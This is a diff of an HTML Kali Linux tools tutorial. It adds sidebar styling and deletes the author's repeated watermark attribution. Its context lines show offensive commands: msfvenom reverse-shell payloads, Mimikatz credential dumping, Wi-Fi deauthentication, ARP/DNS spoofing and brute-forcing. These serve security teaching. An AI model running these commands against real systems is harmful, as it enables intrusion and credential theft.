@@ -62,6 +62,12 @@
         /* ========== LEFT SIDEBAR PANEL ========== */
         .sidebar { width: 300px; flex-shrink: 0; background: var(--header-bg); border: 1px solid var(--hairline-color); border-radius: 20px; padding: 20px; position: sticky; top: 100px; max-height: calc(100vh - 120px); overflow-y: auto; }
         .sidebar-header h3 { font-size: 0.9rem; color: var(--body-quiet-color); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid var(--hairline-color); }
+        
+        /* Back Buttons Styling */
+        .sidebar-back-btns { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; padding-bottom: 20px; border-bottom: 1px solid var(--hairline-color); }
+        .sidebar-back-btn { display: block; text-align: center; background: var(--selected-bg); color: var(--body-fg); padding: 10px; border-radius: 8px; text-decoration: none; font-size: 0.85rem; font-weight: 600; border: 1px solid var(--hairline-color); transition: 0.2s; }
+        .sidebar-back-btn:hover { background: var(--darkened-bg); border-color: var(--primary); color: var(--primary); }
+
         .sidebar-nav ul { list-style: none; }
         .sidebar-nav ul li { margin-bottom: 8px; }
         .sidebar-nav ul li a { display: block; padding: 12px 15px; border-radius: 10px; text-decoration: none; color: var(--body-quiet-color); font-size: 0.9rem; font-weight: 600; transition: 0.2s; border: 1px solid transparent; }
@@ -90,7 +96,6 @@
         pre { background: var(--input-bg); padding: 15px; border-radius: 8px; border: 1px solid var(--hairline-color); overflow-x: auto; margin: 1.5rem 0; font-family: 'Courier New', Courier, monospace; font-size: 0.85rem; line-height: 1.5; color: var(--body-fg); white-space: pre-wrap; word-wrap: break-word; }
         pre code { color: var(--primary); }
         .ascii-art { color: var(--body-quiet-color); background: var(--darkened-bg); text-align: left; }
-        .watermark { color: var(--body-quiet-color); font-size: 0.85rem; text-align: center; margin: 2rem 0; font-style: italic; opacity: 0.7; }
         
         /* Structured Table of Contents */
         .toc-main { list-style: none; padding-left: 0; }
@@ -194,7 +199,7 @@
                 <li><a href="labs.html">Networking Labs Overview</a></li>
                 <li><a href="nessus.html">Nessus Vulnerability Assessment</a></li>
                 <li><a href="lesson-4.html">Vulnerability Scanners</a></li>
-                <li><a href="kali-tools.html">Top 50 Kali Linux Tools</a></li>
+                <li><a href="kali-tools.html" class="active">Top 50 Kali Linux Tools</a></li>
                 <li><a href="lesson-6.html">Lesson Six Title</a></li>
                 <li><a href="lesson-7.html">Lesson Seven Title</a></li>
             </ul>
@@ -353,7 +358,6 @@
         <!-- Introduction -->
         <section id="introduction">
             <h2 class="section-title">Introduction</h2>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <p class="text-block">Kali Linux has established itself as the premier penetration testing and security auditing platform, bundling over 600 security tools in a single distribution. Originally developed from BackTrack Linux, Kali provides security professionals, ethical hackers, and penetration testers with a comprehensive toolkit for assessing and improving security postures. This technical deep-dive explores the 50 most essential Kali Linux tools, examining their capabilities, practical applications, and advanced usage patterns that distinguish professional security assessments from amateur attempts. Understanding these tools' proper implementation is crucial for conducting thorough security evaluations while maintaining ethical and legal compliance.</p>
         </section>
 
@@ -421,7 +425,6 @@
         <!-- Network Analysis -->
         <section id="network-analysis">
             <h2 class="section-title">Network Analysis and Scanning Tools</h2>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             
             <div class="tool-title"><i class="fas fa-network-wired"></i> 1. Nmap (Network Mapper)</div>
             <p class="text-block">Nmap remains the gold standard for network discovery and security auditing, offering unparalleled flexibility in network reconnaissance:</p>
@@ -459,7 +462,6 @@ masscan 0.0.0.0/0 -p80,443 --excludefile exclude.txt --rate=100000
 
 # Custom packet crafting
 masscan --ports 0-65535 --adapter-ip 192.168.1.100 --router-mac 00:11:22:33:44:55 192.168.1.0/24</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
 
             <div class="tool-title"><i class="fas fa-terminal"></i> 3. Netcat (nc)</div>
             <p class="text-block">The "Swiss Army knife" of networking tools, essential for various security tasks:</p>
@@ -503,7 +505,6 @@ tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.host -e http.r
 
 # Extract files from packet capture
 tshark -r capture.pcap --export-objects "http,extracted_files"</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code># Real-time statistics
 tshark -i eth0 -q -z io,stat,1
 
@@ -548,7 +549,6 @@ burpsuite
 # Position: username=§admin§&password=§password§
 # Payloads: Custom wordlist or runtime generation
 # Options: Follow redirects, store responses</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code># Scanner configuration for authenticated scanning
 # Session handling rules for cookie/token management
 # Scope definition for targeted scanning
@@ -589,7 +589,6 @@ zap-cli report -o zap_report.html -f html
 zap-cli ajax-spider http://target.com</code></pre>
 
             <div class="tool-title"><i class="fas fa-database"></i> 8. SQLMap</div>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <p class="text-block">Automated SQL injection detection and exploitation tool:</p>
             <pre><code># Basic SQL injection test
 sqlmap -u "http://target.com/page?id=1" --batch --risk=3 --level=5
@@ -632,7 +631,6 @@ nikto -h http://target.com -useproxy http://localhost:8080
 nikto -h http://target.com -useragent "Mozilla/5.0" -cookie "session=abc123"
 
 # SSL/TLS testing</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>nikto -h https://target.com -ssl -Tuning 9</code></pre>
 
             <div class="tool-title"><i class="fas fa-folder-tree"></i> 10. Dirb/Dirbuster</div>
@@ -676,7 +674,6 @@ aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon
 
 # WEP cracking
 aireplay-ng -1 0 -a 00:11:22:33:44:55 -h 66:77:88:99:AA:BB -e "NetworkName" wlan0mon</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>aireplay-ng -3 -b 00:11:22:33:44:55 -h 66:77:88:99:AA:BB wlan0mon
 aircrack-ng -b 00:11:22:33:44:55 capture*.cap
 
@@ -718,7 +715,6 @@ wifite --wpa --wpat 600 --wpadt 60 --dict /usr/share/wordlists/rockyou.txt
 wifite -c 6 --power 50
 
 # WPS attacks only</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>wifite --wps --wps-ratio 3 --wps-time 600</code></pre>
         </section>
 
@@ -764,7 +760,6 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > p
 
 # Encode payloads
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded_payload.exe</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
 
             <div class="tool-title"><i class="fas fa-window-restore"></i> 15. BeEF (Browser Exploitation Framework)</div>
             <p class="text-block">Browser-focused exploitation framework:</p>
@@ -806,7 +801,6 @@ setoolkit
 # 2) Standard Metasploit Executable
 
 # Mass mailer attack</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code># 5) Mass Mailer Attack
 # Configure SMTP settings and target list</code></pre>
         </section>
@@ -851,7 +845,6 @@ hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l
 
 # Combination attack</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt
 
 # Rule-based attack
@@ -892,7 +885,6 @@ hydra -l admin -P passwords.txt -f -V ssh://192.168.1.100</code></pre>
             <div class="tool-title"><i class="fas fa-stream"></i> 20. Medusa</div>
             <p class="text-block">Parallel network login brute-forcer:</p>
             <pre><code># Basic usage</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
 
 # Multiple hosts
@@ -931,7 +923,6 @@ gvm-cli --gmp-username admin --gmp-password admin socket --xml "&lt;create_task&
 
 # Command-line scan
 gvm-cli --gmp-username admin --gmp-password admin socket --cmd="get_reports report_id"</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
 
             <div class="tool-title"><i class="fas fa-clipboard-check"></i> 22. Lynis</div>
             <p class="text-block">Security auditing tool for Unix/Linux:</p>
@@ -977,7 +968,6 @@ wapiti -u http://target.com -p http://127.0.0.1:8080
 wapiti -u http://target.com -f html -o report.html
 
 # Scope limitation</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>wapiti -u http://target.com -s http://target.com/app/</code></pre>
         </section>
 
@@ -1022,7 +1012,6 @@ options set SOURCE target.com
 run
 
 # API key management</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>keys add shodan_api XXXXXXXXXXXXXXXX
 modules load recon/hosts-ports/shodan_ip
 run
@@ -1065,7 +1054,6 @@ dmitry -winse target.com
 
 # Subdomain search
 dmitry -s target.com</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code># Email search
 dmitry -e target.com
 
@@ -1103,7 +1091,6 @@ strings -a disk.img | grep -i password
 # Hash calculation
 md5sum disk.img
 sha256sum disk.img</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
         </section>
 
         <!-- Reverse Engineering -->
@@ -1150,7 +1137,6 @@ pdf @ main
 V
 
 # Debug mode</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>r2 -d binary
 
 # Web interface
@@ -1197,7 +1183,6 @@ ropgadget
 info registers
 info proc mappings
 info functions</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code># Stepping
 si # step instruction
 ni # next instruction
@@ -1235,7 +1220,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b '\
             <div class="tool-title"><i class="fas fa-book"></i> 33. Searchsploit</div>
             <p class="text-block">Exploit database search tool:</p>
             <pre><code># Basic search</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>searchsploit apache 2.4
 
 # Detailed search
@@ -1279,7 +1263,6 @@ python -c "print('A' * 100 + 'B' * 4 + 'C' * 200)"
 # Cyclic pattern with pwntools
 python3 -c "from pwn import *; print(cyclic(1000))"
 python3 -c "from pwn import *; print(cyclic_find(0x61616174))"</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
         </section>
 
         <!-- MITM -->
@@ -1327,7 +1310,6 @@ arp.spoof on
 set dns.spoof.domains *.target.com
 set dns.spoof.address 192.168.1.200
 dns.spoof on</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code># HTTP/HTTPS proxy
 set http.proxy.sslstrip true
 http.proxy on
@@ -1363,7 +1345,6 @@ responder -I eth0 --lm-challenge 1122334455667788
 
 # Fingerprint mode
 responder -I eth0 -f</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
         </section>
 
         <!-- Mobile Security -->
@@ -1410,7 +1391,6 @@ mobsf
 curl -F "file=@app.apk" http://localhost:8000/api/v1/upload -H "Authorization: API_KEY"
 
 # Scan</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>curl -X POST http://localhost:8000/api/v1/scan -H "Authorization: API_KEY" -d "hash=file_hash"
 
 # Get report
@@ -1453,7 +1433,6 @@ frida-trace -U -i "open*" com.example.app</code></pre>
             <div class="tool-title"><i class="fas fa-hashtag"></i> 41. Hashidentifier</div>
             <p class="text-block">Hash type identification tool:</p>
             <pre><code># Interactive mode</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>hash-identifier
 
 # Examples:
@@ -1495,7 +1474,6 @@ binwalk -E firmware.bin
 
 # Custom signatures
 binwalk -m custom.sig firmware.bin</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code># Recursive extraction
 binwalk -Me firmware.bin
 
@@ -1539,7 +1517,6 @@ Invoke-Mimikatz -DumpCreds
 
 # PowerUp (privilege escalation)
 Invoke-AllChecks</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code># PowerView (AD enumeration)
 Get-NetDomain
 Get-NetUser
@@ -1582,7 +1559,6 @@ Bypass-4MSI</code></pre>
             <p class="text-block">Collaboration and reporting framework:</p>
             <pre><code># Start Dradis
 service dradis start</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code># Access web interface
 # http://localhost:3000
 
@@ -1625,7 +1601,6 @@ cherrytree
 # - Import/Export capabilities
 
 # Command line</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>cherrytree --filepath=/path/to/notes.ctb</code></pre>
 
             <div class="tool-title"><i class="fas fa-chart-bar"></i> 50. Pipal</div>
@@ -1668,7 +1643,6 @@ nmap -sV -sC -O -A -T4 -oA "$OUTPUT_DIR/nmap_scan" "$TARGET"
 
 # Extract open ports
 PORTS=$(grep -oP '\d+/open' "$OUTPUT_DIR/nmap_scan.gnmap" | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code># Web application scanning
 if echo "$PORTS" | grep -q "80\|443\|8080\|8443"; then
 echo "[*] Web services detected. Running Nikto..."
@@ -1712,7 +1686,6 @@ echo "[*] Assessment complete. Results saved to $OUTPUT_DIR"</code></pre>
 # Custom security assessment tool
 
 import subprocess</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <pre><code>import json
 import argparse
 from datetime import datetime
@@ -1761,7 +1734,6 @@ assessor.generate_report()</code></pre>
         <!-- Best Practices -->
         <section id="best-practices">
             <h2 class="section-title">Best Practices for Kali Linux Tool Usage</h2>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             
             <h3 class="tool-title">Legal and Ethical Considerations</h3>
             <p class="text-block">Using Kali Linux tools requires strict adherence to legal and ethical guidelines:</p>
@@ -1788,7 +1760,6 @@ assessor.generate_report()</code></pre>
             <p class="text-block">1. Reconnaissance Phase<br>○ Passive: Maltego, theHarvester, Recon-ng<br>○ Active: Nmap, Masscan, Dmitry</p>
             <p class="text-block">2. Vulnerability Assessment<br>○ Network: OpenVAS, Nessus (commercial)<br>○ Web: Burp Suite, OWASP ZAP, Nikto<br>○ System: Lynis, Wapiti</p>
             <p class="text-block">3. Exploitation<br>○ Framework: Metasploit, BeEF<br>○ Manual: SearchSploit, custom exploits<br>○ Social: SET, Gophish</p>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <p class="text-block">4. Post-Exploitation<br>○ Windows: Mimikatz, PowerSploit<br>○ Linux: LinEnum, LinPEAS<br>○ Persistence: Empire, Covenant</p>
             <p class="text-block">5. Reporting<br>○ Collaboration: Dradis, Faraday<br>○ Documentation: CherryTree, Screenshots<br>○ Analysis: Pipal, custom scripts</p>
         </section>
@@ -1808,7 +1779,6 @@ assessor.generate_report()</code></pre>
             <div class="tool-title">Which Kali Linux tools should beginners focus on first?</div>
             <p class="text-block">For beginners entering the cybersecurity field, focusing on foundational tools provides the best learning path:</p>
             <p class="text-block">1. Start with Network Basics:</p>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <p class="text-block">○ Nmap: Master basic port scanning before advanced features<br>○ Wireshark: Understand network protocols through packet analysis<br>○ Netcat: Learn networking fundamentals through this versatile tool</p>
             <p class="text-block">2. Web Application Testing:<br>○ Burp Suite Community: Essential for understanding web security<br>○ OWASP ZAP: Free alternative with good learning resources<br>○ Nikto: Simple yet effective for basic web scanning</p>
             <p class="text-block">3. Information Gathering:<br>○ theHarvester: Easy to use for OSINT collection<br>○ Whois/DNS tools: Understand information disclosure<br>○ Google Dorking: Master advanced search techniques</p>
@@ -1827,7 +1797,6 @@ assessor.generate_report()</code></pre>
 - VulnHub machines
 - HackTheBox (with subscription)</code></pre>
             <p class="text-block">2. Online Platforms:<br>○ TryHackMe: Guided learning paths with legal targets<br>○ HackTheBox: Realistic environments for practice<br>○ PentesterLab: Web application security focus<br>○ OverTheWire: Wargames and challenges<br>○ VulnHub: Downloadable vulnerable VMs</p>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <p class="text-block">Home Lab Setup:</p>
             <pre><code># Basic home lab network
 - Isolated network segment
@@ -1843,7 +1812,6 @@ assessor.generate_report()</code></pre>
             <p class="text-block">2. Scanning and Enumeration Tools:<br>○ Service identification: Version detection and banner grabbing<br>○ Vulnerability correlation: Matching services to known vulnerabilities<br>○ Purpose: Detailed technical information gathering<br>○ Key tools: Nmap, Enum4linux, SMBclient, SNMP-walk</p>
             <p class="text-block">3. Vulnerability Assessment Tools:<br>○ Automated scanners: Broad vulnerability detection (OpenVAS, Nessus)<br>○ Specialized scanners: Focused on specific technologies (WPScan, SQLMap)<br>○ Purpose: Identify potential security weaknesses<br>○ Balance: Automated scanning with manual verification</p>
             <p class="text-block">4. Exploitation Tools:<br>○ Frameworks: Comprehensive exploitation platforms (Metasploit, BeEF)<br>○ Standalone: Specific exploit tools (SQLMap, THC-Hydra)<br>○ Purpose: Verify vulnerabilities through controlled exploitation</p>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <p class="text-block">○ Caution: High impact, use only with explicit permission</p>
             <p class="text-block">5. Post-Exploitation Tools:<br>○ Persistence: Maintaining access (Empire, Mimikatz)<br>○ Lateral movement: Expanding access (CrackMapExec, PSExec)<br>○ Purpose: Demonstrate impact and data access risks<br>○ Critical: Document everything, minimize system changes</p>
 
@@ -1857,7 +1825,6 @@ assessor.generate_report()</code></pre>
             <p class="text-block">Hydra vs Medusa vs Ncrack:<br>- Hydra: Most protocols supported<br>- Medusa: Stable, modular design<br>- Ncrack: High-performance engine<br>Hydra for versatility, Ncrack for speed</p>
             <p class="text-block">Network Scanners:</p>
             <p class="text-block">Nmap vs Masscan vs Zmap:<br>- Nmap: Feature-rich, accurate<br>- Masscan: Internet-scale scanning<br>- Zmap: Specialized for research<br>Nmap for precision, Masscan for speed</p>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <p class="text-block">Exploitation Frameworks:</p>
             <p class="text-block">Metasploit vs BeEF vs Empire:<br>- Metasploit: General exploitation<br>- BeEF: Browser-focused attacks<br>- Empire: Post-exploitation focus<br>Choose based on attack vector</p>
 
@@ -1881,7 +1848,6 @@ sqlmap -u "http://target.com/page?id=1" --dump-all
 
 # RIGHT: Comprehensive logging
 sqlmap -u "http://target.com/page?id=1" --batch -v 3 --output-dir=./sqlmap_results/</code></pre>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
             <p class="text-block">Ignoring Scope:<br>○ Always verify IP ranges and domains<br>○ Check for cloud services that may be out of scope<br>○ Respect time windows for testing<br>○ Avoid testing production systems during business hours</p>
             <p class="text-block">Inadequate Cleanup:</p>
             <pre><code># Always remove:
@@ -1917,7 +1883,6 @@ sqlmap -u "http://target.com/page?id=1" --batch -v 3 --output-dir=./sqlmap_resul
                 <li>TryHackMe - Cybersecurity Training</li>
                 <li>HackTheBox - Penetration Testing Labs</li>
             </ul>
-            <div class="watermark">Okan YILDIZ | Global Cybersecurity Leader | Innovating for Secure Digital Futures | Trusted Advisor in Cyber Resilience</div>
         </section>
 
         <!-- LESSON NAVIGATION BUTTONS -->
